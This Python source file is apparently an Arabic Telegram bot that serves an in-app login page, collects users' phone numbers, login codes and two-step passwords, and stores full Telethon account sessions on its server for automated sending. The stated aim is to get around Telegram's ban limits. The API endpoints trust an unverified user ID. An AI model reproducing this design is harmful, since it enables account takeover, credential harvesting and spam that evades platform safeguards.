"""
⚡ هادر بوت — نسخة الـ WebApp الاحترافية
تسجيل دخول آمن وعبر واجهة ويب مدمجة داخل تليجرام لتخطي قيود الحظر والـ DC.
"""

import asyncio
import os
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.utils.web_app import safe_parse_webapp_data
from aiohttp import web
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import config

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

# إعداد البوت كواجهة مستخدم
bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

# حفظ الكلاينتات النشطة بالذاكرة مؤقتاً أثناء العملية
PENDING_LOGINS = {}

# ══════════════════════════════════════════════════════════════════════════════
#  أوامر البوت وأزرار الـ WebApp
# ══════════════════════════════════════════════════════════════════════════════
@dp.message(Command("start"))
async def cmd_start(message: Message):
    # رابط الـ WebApp المربوط بسيرفر البوت
    # ملاحظة: استبدل الرابط أدناه برابط مشروعك في Railway (الدومين العام الموفر لك مجاناً)
    web_app_url = f"https://{os.getenv('RAILWAY_PUBLIC_DOMAIN', 'your-railway-url.up.railway.app')}/login-page"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 ربط حسابك الشخصي (بلمسة زر)", web_app_info=WebAppInfo(url=web_app_url))]
    ])
    
    welcome_text = (
        "👋 **أهلاً بك في هادر بوت الاحترافي!**\n\n"
        "لتشغيل الإرسال التلقائي باسم حسابك الشخصي بكل سهولة وبدون إيرورات، اضغط على الزر أدناه لفتح واجهة الربط الآمنة 👇"
    )
    await message.reply(welcome_text, parse_mode="Markdown", reply_markup=keyboard)


# ══════════════════════════════════════════════════════════════════════════════
#  سيرفر الويب المدمج (HTML لويندوز تسجيل الدخول)
# ══════════════════════════════════════════════════════════════════════════════
async def handle_login_page(request):
    # صفحة HTML خفيفة وأنيقة تفتح داخل تليجرام كـ Web App
    html_content = """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ربط الحساب الشخصي</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        <style>
            body { font-family: system-ui, sans-serif; background-color: #182533; color: white; padding: 20px; text-align: center; }
            .card { background: #243141; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); margin-top: 20px; }
            input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; font-size: 16px; text-align: center; }
            button { width: 94%; padding: 12px; background: #248bcf; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
            button:hover { background: #299cdb; }
            .step { display: none; }
            .active { display: block; }
            .error { color: #ff5252; font-size: 14px; margin-top: 10px; }
        </style>
    </head>
    <body>
        <h2>⚡ بوابة هادر الآمنة</h2>
        <div class="card">
            <div id="step1" class="step active">
                <p>أدخل رقم جوالك مع رمز الدولة:</p>
                <input type="tel" id="phone" value="+966">
                <button onclick="sendPhone()">ارسال رقم الجوال 📩</button>
            </div>
            
            <div id="step2" class="step">
                <p>أدخل رمز التحقق الذي وصلك على تليجرام:</p>
                <input type="number" id="code" placeholder="12345">
                <button onclick="sendCode()">تأكيد الرمز 🔐</button>
            </div>

            <div id="step3" class="step">
                <p>حسابك محمي بخطوتين، أدخل كلمة المرور:</p>
                <input type="password" id="password" placeholder="كلمة المرور">
                <button onclick="sendPassword()">دخول 🔑</button>
            </div>
            
            <div id="error-msg" class="error"></div>
        </div>

        <script>
            const tg = window.Telegram.WebApp;
            tg.expand(); // تمديد الشاشة بالكامل
            
            let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "test_user";

            async function sendPhone() {
                const phone = document.getElementById('phone').value.trim();
                showError("");
                const res = await fetch('/api/send-phone', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ user_id: userId, phone: phone })
                });
                const data = await res.json();
                if (data.success) {
                    document.getElementById('step1').classList.remove('active');
                    document.getElementById('step2').classList.add('active');
                } else { showError(data.error); }
            }

            async function sendCode() {
                const code = document.getElementById('code').value.trim();
                showError("");
                const res = await fetch('/api/send-code', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ user_id: userId, code: code })
                });
                const data = await res.json();
                if (data.success) {
                    if (data.need_password) {
                        document.getElementById('step2').classList.remove('active');
                        document.getElementById('step3').classList.add('active');
                    } else {
                        tg.showAlert("🟢 تم ربط حسابك بنجاح تامي!");
                        tg.close();
                    }
                } else { showError(data.error); }
            }

            async function sendPassword() {
                const password = document.getElementById('password').value.trim();
                showError("");
                const res = await fetch('/api/send-password', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ user_id: userId, password: password })
                });
                const data = await res.json();
                if (data.success) {
                    tg.showAlert("🟢 تم التحقق من كلمة المرور وربط الحساب!");
                    tg.close();
                } else { showError(data.error); }
            }

            function showError(msg) { document.getElementById('error-msg').innerText = msg; }
        </script>
    </body>
    </html>
    """
    return web.Response(text=html_content, content_type='text/html')

# ══════════════════════════════════════════════════════════════════════════════
#  الـ APIs الخلفية لمعالجة بيانات الـ WebApp والـ Telethon
# ══════════════════════════════════════════════════════════════════════════════
async def api_send_phone(request):
    data = await request.json()
    user_id = str(data.get("user_id"))
    phone = data.get("phone", "").replace(" ", "")
    
    session_path = f"sessions/user_{user_id}"
    os.makedirs("sessions", exist_ok=True)
    
    client = TelegramClient(session_path, config.API_ID, config.API_HASH)
    await client.connect()
    
    try:
        send_code_result = await client.send_code_request(phone)
        PENDING_LOGINS[user_id] = {
            "client": client, "phone": phone, "phone_code_hash": send_code_result.phone_code_hash
        }
        return web.json_response({"success": True})
    except Exception as e:
        await client.disconnect()
        return web.json_response({"success": False, "error": str(e)})

async def api_send_code(request):
    data = await request.json()
    user_id = str(data.get("user_id"))
    code = data.get("code", "")
    
    if user_id not in PENDING_LOGINS:
        return web.json_response({"success": False, "error": "انتهت صلاحية الجلسة، أعد المحاولة"})
        
    login_data = PENDING_LOGINS[user_id]
    client = login_data["client"]
    
    try:
        await client.sign_in(phone=login_data["phone"], code=code, phone_code_hash=login_data["phone_code_hash"])
        # إرسال رسالة تأكيد للمستخدم بالخاص عبر البوت
        try: await bot.send_message(chat_id=user_id, text="🟢 **تم ربط حسابك الشخصي بنجاح عبر بوابة الويب الآمنة!**")
        except Exception: pass
        return web.json_response({"success": True, "need_password": False})
    except SessionPasswordNeededError:
        return web.json_response({"success": True, "need_password": True})
    except Exception as e:
        return web.json_response({"success": False, "error": str(e)})

async def api_send_password(request):
    data = await request.json()
    user_id = str(data.get("user_id"))
    password = data.get("password", "")
    
    login_data = PENDING_LOGINS[user_id]
    client = login_data["client"]
    
    try:
        await client.sign_in(password=password)
        try: await bot.send_message(chat_id=user_id, text="🟢 **تم التحقق من كلمة المرور وربط حسابك بنجاح!**")
        except Exception: pass
        return web.json_response({"success": True})
    except Exception as e:
        return web.json_response({"success": False, "error": str(e)})

# ══════════════════════════════════════════════════════════════════════════════
#  بدء تشغيل البوت مع سيرفر الويب في نفس الوقت
# ══════════════════════════════════════════════════════════════════════════════
async def main():
    # إعداد سيرفر الويب المدمج لخدمة واجهة الـ WebApp
    app = web.Application()
    app.router.add_get('/login-page', handle_login_page)
    app.router.add_post('/api/send-phone', api_send_phone)
    app.router.add_post('/api/send-code', api_send_code)
    app.router.add_post('/api/send-password', api_send_password)
    
    runner = web.AppRunner(app)
    await runner.setup()
    
    # تحديد المنفذ (Port) الموفر تلقائياً من Railway
    port = int(os.getenv("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    log.info(f"🌐 سيرفر الويب الخاص بالـ WebApp شغال على المنفذ: {port}")
    
    log.info("🚀 تشغيل البوت الرسمي لاستقبال رسائل المستخدمين...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
